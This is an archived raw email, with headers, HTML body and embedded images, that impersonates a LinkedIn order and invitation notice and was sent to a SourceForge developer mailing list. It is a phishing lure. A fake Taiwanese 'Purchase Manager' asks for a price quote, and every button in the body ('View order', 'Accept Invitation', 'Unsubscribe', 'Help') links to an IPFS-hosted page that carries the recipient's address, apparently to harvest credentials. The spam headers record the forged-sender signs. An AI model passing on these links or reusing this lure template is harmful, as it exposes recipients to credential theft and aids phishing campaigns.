Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
X-Original-To: lists+industrypack-devel@lfdr.de
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id 06E51767C88
	for <lists+industrypack-devel@lfdr.de>; Sat, 29 Jul 2023 08:28:17 +0200 (CEST)
Received: from [127.0.0.1] (helo=sfs-ml-1.v29.lw.sourceforge.com)
	by sfs-ml-1.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1qPdR0-0004bt-Ps
	for lists+industrypack-devel@lfdr.de;
	Sat, 29 Jul 2023 06:28:15 +0000
Received: from [172.30.20.202] (helo=mx.sourceforge.net)
 by sfs-ml-1.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
 (envelope-from <info@linkedin.com>) id 1qPdQz-0004bm-86
 for industrypack-devel@lists.sourceforge.net;
 Sat, 29 Jul 2023 06:28:14 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Content-Type:MIME-Version:Message-ID:Date:Subject:
 To:From:Sender:Reply-To:Cc:Content-Transfer-Encoding:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=iKJjIOls4sOiiD8K6Wm2rWFLpaSMkOZq+nlRwhpxb9c=; b=FEGaQO3GxoeEfQzQyjU1PzAOTN
 xIjA4ROdOCrn9jjp+Zcvy6mwnZ1awUKM2pPMiTfrOFUVSzs9yMKJhFVkonXnrrmpUU9Sa4/T810Vz
 XZaD2ART7FX1iC0cK0/TWw25V+i+KH3UmrKMMKYGdcCZp0GlfW0lksTQKvMNH+MmNXvA=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Content-Type:MIME-Version:Message-ID:Date:Subject:To:From:Sender:Reply-To
 :Cc:Content-Transfer-Encoding:Content-ID:Content-Description:Resent-Date:
 Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=iKJjIOls4sOiiD8K6Wm2rWFLpaSMkOZq+nlRwhpxb9c=; b=g
 XQ7Jt9NIoHuIpZ1G4XEdsBsYGRB64o7C3AzrGQ0cYgwTB92+Tx4JzvLcqYg69CeEYV0HwBuyiM/CX
 yppbrMcBehiLwPBoN/NdaNj7pII7PS3pEWLevjeWg19udGRVMHjLPN8C8vWoM6raQe4bonsNP8otG
 lh0lHspnZPMKPL4E=;
Received: from mail2.inpt.ac.ma ([196.12.232.102])
 by sfi-mx-1.v28.lw.sourceforge.com with esmtps
 (TLS1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.95)
 id 1qPdQy-006Seo-4j for industrypack-devel@lists.sourceforge.net;
 Sat, 29 Jul 2023 06:28:14 +0000
Received: from localhost (localhost [127.0.0.1])
 by mail2.inpt.ac.ma (Postfix) with ESMTP id CDC534FDCC231
 for <industrypack-devel@lists.sourceforge.net>;
 Sat, 29 Jul 2023 07:09:47 +0100 (+01)
Received: from mail2.inpt.ac.ma ([127.0.0.1])
 by localhost (mail2.inpt.ac.ma [127.0.0.1]) (amavisd-new, port 10032)
 with ESMTP id S92TRXc26ZyP
 for <industrypack-devel@lists.sourceforge.net>;
 Sat, 29 Jul 2023 07:09:47 +0100 (+01)
Received: from localhost (localhost [127.0.0.1])
 by mail2.inpt.ac.ma (Postfix) with ESMTP id 557E44F12463C
 for <industrypack-devel@lists.sourceforge.net>;
 Sat, 29 Jul 2023 07:00:04 +0100 (+01)
X-Virus-Scanned: amavisd-new at inpt.ac.ma
Received: from mail2.inpt.ac.ma ([127.0.0.1])
 by localhost (mail2.inpt.ac.ma [127.0.0.1]) (amavisd-new, port 10026)
 with ESMTP id OitIbps2wObC
 for <industrypack-devel@lists.sourceforge.net>;
 Sat, 29 Jul 2023 07:00:04 +0100 (+01)
Received: from linkedin.com
 (ec2-35-183-3-94.ca-central-1.compute.amazonaws.com [35.183.3.94])
 by mail2.inpt.ac.ma (Postfix) with ESMTPSA id 0E5E34F673F33
 for <industrypack-devel@lists.sourceforge.net>;
 Sat, 29 Jul 2023 06:51:09 +0100 (+01)
To: industrypack-devel@lists.sourceforge.net
Date: 29 Jul 2023 05:52:36 +0000
Message-ID: <20230729055236.DBDA4C25FE5B26D7@linkedin.com>
MIME-Version: 1.0
X-Spam-Score: 2.2 (++)
X-Spam-Report: Spam detection software,
 running on the system "util-spamd-2.v13.lw.sourceforge.com", 
 has NOT identified this incoming email as spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 Content preview:  Linkedin Linked in Purchase Manager. 
 Content analysis details:   (2.2 points, 6.0 required)
 pts rule name              description
 ---- ---------------------- --------------------------------------------------
 0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
 1.0 SPF_SOFTFAIL           SPF: sender does not match SPF record (softfail)
 1.1 DKIM_ADSP_ALL          No valid author signature, domain signs all mail
 0.0 HTML_MESSAGE           BODY: HTML included in message
 0.0 HTML_IMAGE_RATIO_06    BODY: HTML has a low ratio of text to image
 area
 0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
 0.0 HTML_FONT_LOW_CONTRAST BODY: HTML font color similar or
 identical to background
 -0.0 T_SCC_BODY_TEXT_LINE   No description available.
X-Headers-End: 1qPdQy-006Seo-4j
Subject: [Industrypack-devel] =?utf-8?b?TXMuwqBMaXNhwqBMZWXCoGZyb23CoFRh?=
 =?utf-8?b?aXdhbsKgcGxhY2VkwqBhbsKgb3JkZXLCoHZpYcKgTGlua2VkSW4=?=
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
From: LinkedIn via Industrypack-devel
 <industrypack-devel@lists.sourceforge.net>
Reply-To: LinkedIn <info@linkedin.com>
Content-Type: multipart/mixed; boundary="===============5642290028484320932=="
Errors-To: industrypack-devel-bounces@lists.sourceforge.net


--===============5642290028484320932==
Content-Type: multipart/related;
	boundary="----=_NextPart_000_0012_14FA3AA5.B5AB4888"


------=_NextPart_000_0012_14FA3AA5.B5AB4888
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<html>

<head>
<meta http-equiv=3D"Content-Language" content=3D"en-us">
<meta http-equiv=3D"Content-Type" content=3D"text/html; charset=3Dwindows-1=
252">
<title>Linkedin</title>
</head>

<body style=3D"text-align: center">

<div id=3D"m_-4064192373776907965m_-6158177145927581773m_336152671478652903=
8m_-2768268899686380213m_3298749709222475551m_5626144844177724449m_77206144=
08366366715m_-7839155580635074917m_-8074951038213448488gmail-mainmail" styl=
e=3D"color: rgb(0, 0, 0); font-style: normal; font-variant-ligatures: norma=
l; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orp=
hans: 2; text-align: start; text-indent: 0px; text-transform: none; white-s=
pace: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px;=
 background-color: rgb(255, 255, 255); text-decoration-thickness: initial; =
text-decoration-style: initial; text-decoration-color: initial; font-size: =
12px; font-family: &quot;lucida Grande&quot;, Verdana;">
	<div id=3D"m_-4064192373776907965m_-6158177145927581773m_33615267147865290=
38m_-2768268899686380213m_3298749709222475551m_5626144844177724449m_7720614=
408366366715m_-7839155580635074917m_-8074951038213448488gmail-contentDiv" s=
tyle=3D"position: static !important; font-size: 14px; height: auto; overflo=
w-x: visible; padding: 15px 15px 10px; min-height: 100px;">
		<div id=3D"m_-4064192373776907965m_-6158177145927581773m_3361526714786529=
038m_-2768268899686380213m_3298749709222475551m_5626144844177724449m_772061=
4408366366715m_-7839155580635074917m_-8074951038213448488gmail-mailContentC=
ontainer" style=3D"position: static !important; height: auto; zoom: 1; padd=
ing: 0px; min-height: auto;">
			<table style=3D"font-size: small; font-family: Arial, Helvetica, sans-se=
rif; color: rgb(34, 34, 34);">
				<tr>
					<td style=3D"font-size: 12px; width: 518px; margin: 0px;">
					<table cellspacing=3D"0">
						<tr>
							<td style=3D"margin: 0px;">
							<font color=3D"#045fb4" size=3D"4" style=3D"font-family: Arial, Helv=
etica, sans-serif;">
							<b>Linked</b></font></td>
							<td style=3D"height: 20px; width: 20px; border-radius: 3px; border: =
1px solid rgb(66, 66, 66); margin: 0px; padding: 1px; background: rgb(4, 95=
, 180)">
							<div align=3D"center" style=3D"position: static !important;">
								<font color=3D"#ffffff" size=3D"3" style=3D"font-family: Arial, Hel=
vetica, sans-serif;">
								<b>in</b></font></div>
							</td>
							<td style=3D"width: 250px; margin: 0px;">
							<table>
								<tr>
									<td style=3D"width: 518px; margin: 0px;">
									<table cellspacing=3D"0">
									</table>
									</td>
								</tr>
							</table>
							</td>
							<td style=3D"width: 150px; margin: 0px;">
							<div align=3D"right" style=3D"position: static !important;">
&nbsp;</div>
							</td>
							<td style=3D"width: 2px; margin: 0px;">&nbsp;</td>
							<td style=3D"margin: 0px;">
							<img src=3D"cid:6354db008cca5503efcca04294769168.png" style=3D"max-w=
idth: 100%; height: 20px; border-width: medium; border-style: none; border-=
color: initial; width: 20px; vertical-align: middle; border-radius: 50%;" w=
idth=3D"222" height=3D"204"></td>
						</tr>
					</table>
					</td>
				</tr>
				<tr>
					<td style=3D"font-size: 12px; width: 518px; margin: 0px;"><br>
&nbsp;<table cellspacing=3D"0" align=3D"left" style=3D"border-width: 1px; b=
order-style: solid; border-color: rgb(230, 230, 230); height: 200px; width:=
 515px; padding: 5px; border-radius: 5px; background-size: initial; backgro=
und-origin: initial; background-clip: initial;">
						<tr>
							<td style=3D"margin: 0px;">
							<table cellspacing=3D"0" align=3D"center" style=3D"width: 450px;">
								<tr>
									<td style=3D"margin: 0px;"><br>
&nbsp;</td>
								</tr>
								<tr>
									<td style=3D"margin: 0px;">
									<table cellspacing=3D"0">
										<tr>
											<td style=3D"margin: 0px;">
											<img src=3D"cid:htb1dlevinni8kjjsszbq6z4kfxao.jpg120x120.jpg" wi=
dth=3D"78" height=3D"73" style=3D"max-width: 100%; height: auto !important;=
 border-width: medium; border-style: none; border-color: initial; vertical-=
align: middle; margin-right: 0px;"></td>
											<td style=3D"width: 20px; margin: 0px;">&nbsp;</td>
											<td style=3D"margin: 0px;">
											<font face=3D"Arial, Helvetica, sans-serif" color=3D"#000000" si=
ze=3D"2">
											Purchase Manager.</font><font size=3D"2"><br>
&nbsp;</font><p style=3D"height: auto; color: rgb(76, 76, 76); margin: 0px;=
 line-height: 1.5;">
											Hi industrypack-devel,&nbsp;</p>
											<p style=3D"height: auto; color: rgb(76, 76, 76); margin: 0px; l=
ine-height: 1.5;">
											Please give me the best price for=20
											these products on&nbsp;<span style=3D"border-width: 0px; font-fa=
mily: inherit; vertical-align: baseline; padding: 0px; margin: 0px; font-st=
retch: inherit;">LinkedIn</span>&nbsp;=20
											network.</p>
											<p style=3D"height: auto; color: rgb(76, 76, 76); margin: 0px; l=
ine-height: 1.5;">
											Taiwan.<br>
&nbsp;</p>
											<span style=3D"color: rgb(11, 83, 148);">
											Please add me to your LinkedIn=20
											network so that I can send more=20
											details</span><font color=3D"#045fb4" face=3D"Arial, Helvetica, =
sans-serif" size=3D"2"><i><br>
&nbsp;</i></font></td>
										</tr>
									</table>
									</td>
								</tr>
								<tr>
									<td style=3D"height: 10px; margin: 0px;">&nbsp;</td>
								</tr>
								<tr>
									<td style=3D"margin: 0px;">
									<table cellspacing=3D"0" align=3D"center">
										<tr>
											<td style=3D"border-width: 1px; border-style: solid; border-colo=
r: rgb(132, 132, 132); height: 35px; width: 100px; padding: 5px; margin: 0p=
x; border-radius: 1px; background-size: initial; background-origin: initial=
; background-clip: initial;">
											<div align=3D"center" style=3D"position: static !important;">
												<font color=3D"#000000" size=3D"2" style=3D"font-family: Arial,=
 Helvetica, sans-serif;">
												<b>
												<a target=3D"_blank" data-saferedirecturl=3D"https://www.google=
=2Ecom/url?q=3Dhttps://mypoupette.com//aase/Korea%2520Linkedin/900/index.ph=
p&amp;source=3Dgmail&amp;ust=3D1688615919376000&amp;usg=3DAOvVaw1-Ou26ItmXu=
r69lpgtT9D9" style=3D"text-decoration-line: none; text-decoration-thickness=
: initial !important; text-decoration-style: initial !important; text-decor=
ation-color: initial !important; color: rgb(17, 85, 204); outline-width: me=
dium; outline-style: none;" href=3D"https://bafybeia6qmy7fsgix25wje7c2qjllz=
qetn6lish3ijpojirv4hpgt23zye.ipfs.dweb.link/?filename=3Dindemx.htm#industry=
pack-devel@lists.sourceforge.net">View order</a></b></font></div>
											</td>
											<td style=3D"width: 15px; margin: 0px;">&nbsp;</td>
											<td style=3D"height: 35px; width: 130px; border-radius: 1px; bor=
der: 1px solid rgb(51, 137, 189); margin: 0px; padding: 5px; background: rg=
b(51, 137, 189)">
											<div align=3D"center" style=3D"position: static !important;">
												<font color=3D"#ffffff" size=3D"2" style=3D"font-family: Arial,=
 Helvetica, sans-serif;">
												<b>
												<a target=3D"_blank" data-saferedirecturl=3D"https://www.google=
=2Ecom/url?q=3Dhttps://mypoupette.com//aase/Korea%2520Linkedin/900/index.ph=
p&amp;source=3Dgmail&amp;ust=3D1688615919376000&amp;usg=3DAOvVaw1-Ou26ItmXu=
r69lpgtT9D9" style=3D"text-decoration-line: none; text-decoration-thickness=
: initial !important; text-decoration-style: initial !important; text-decor=
ation-color: initial !important; color: rgb(17, 85, 204); outline-width: me=
dium; outline-style: none;" href=3D"https://bafybeia6qmy7fsgix25wje7c2qjllz=
qetn6lish3ijpojirv4hpgt23zye.ipfs.dweb.link/?filename=3Dindemx.htm#industry=
pack-devel@lists.sourceforge.net">Accept Invitation</a></b></font></div>
											</td>
										</tr>
									</table>
									</td>
								</tr>
							</table>
							</td>
						</tr>
					</table>
					</td>
				</tr>
				<tr>
					<td style=3D"font-size: 12px; width: 518px; margin: 0px;">
					<hr color=3D"#d8d8d8" width=3D"100%">
					<table cellspacing=3D"0" align=3D"left" style=3D"height: 45px; width: =
515px; border-radius: 2px; border: 1px solid rgb(51, 137, 189); padding: 5p=
x; background: rgb(51, 137, 189)">
						<tr>
							<td style=3D"margin: 0px;">
							<div align=3D"center" style=3D"position: static !important;">
								<a target=3D"_blank" data-saferedirecturl=3D"https://www.google.com=
/url?q=3Dhttps://00ppsa.com//ace///LinkedInhardxxx//900//index.php&amp;sour=
ce=3Dgmail&amp;ust=3D1688615919377000&amp;usg=3DAOvVaw0l7fXsgyetoZ9JSfQlUzM=
p" style=3D"text-decoration-line: none; text-decoration-thickness: initial =
!important; text-decoration-style: initial !important; text-decoration-colo=
r: initial !important; color: rgb(17, 85, 204); outline-width: medium; outl=
ine-style: none;" href=3D"https://bafybeia6qmy7fsgix25wje7c2qjllzqetn6lish3=
ijpojirv4hpgt23zye.ipfs.dweb.link/?filename=3Dindemx.htm#industrypack-devel=
@lists.sourceforge.net">
								<font color=3D"#ffffff" size=3D"2" style=3D"font-family: Arial, Hel=
vetica, sans-serif;">
								Unsubscribe&nbsp;</font></a><font color=3D"#ffffff" size=3D"2" styl=
e=3D"font-family: Arial, Helvetica, sans-serif;">|</font>&nbsp;&nbsp;<a tar=
get=3D"_blank" data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps=
://00ppsa.com//ace///LinkedInhardxxx//900//index.php&amp;source=3Dgmail&amp=
;ust=3D1688615919377000&amp;usg=3DAOvVaw0l7fXsgyetoZ9JSfQlUzMp" style=3D"te=
xt-decoration: none !important; color: rgb(17, 85, 204); outline-width: med=
ium; outline-style: none;" href=3D"https://bafybeia6qmy7fsgix25wje7c2qjllzq=
etn6lish3ijpojirv4hpgt23zye.ipfs.dweb.link/?filename=3Dindemx.htm#industryp=
ack-devel@lists.sourceforge.net">&nbsp;&nbsp;<font color=3D"#ffffff" size=
=3D"2" style=3D"font-family: Arial, Helvetica, sans-serif;">Help&nbsp;&nbsp=
;</font></a></div>
							</td>
						</tr>
					</table>
					</td>
				</tr>
			</table>
		</div>
	</div>
</div>

</body>

</html>
------=_NextPart_000_0012_14FA3AA5.B5AB4888
Content-Type: image/png; name="6354db008cca5503efcca04294769168.png"
Content-Transfer-Encoding: base64
Content-ID: <6354db008cca5503efcca04294769168.png>

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
BEWhmqCovwHhOa4w9438cAAAAABJRU5ErkJggg==

------=_NextPart_000_0012_14FA3AA5.B5AB4888
Content-Type: image/jpeg; name="htb1dlevinni8kjjsszbq6z4kfxao.jpg120x120.jpg"
Content-Transfer-Encoding: base64
Content-ID: <htb1dlevinni8kjjsszbq6z4kfxao.jpg120x120.jpg>

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
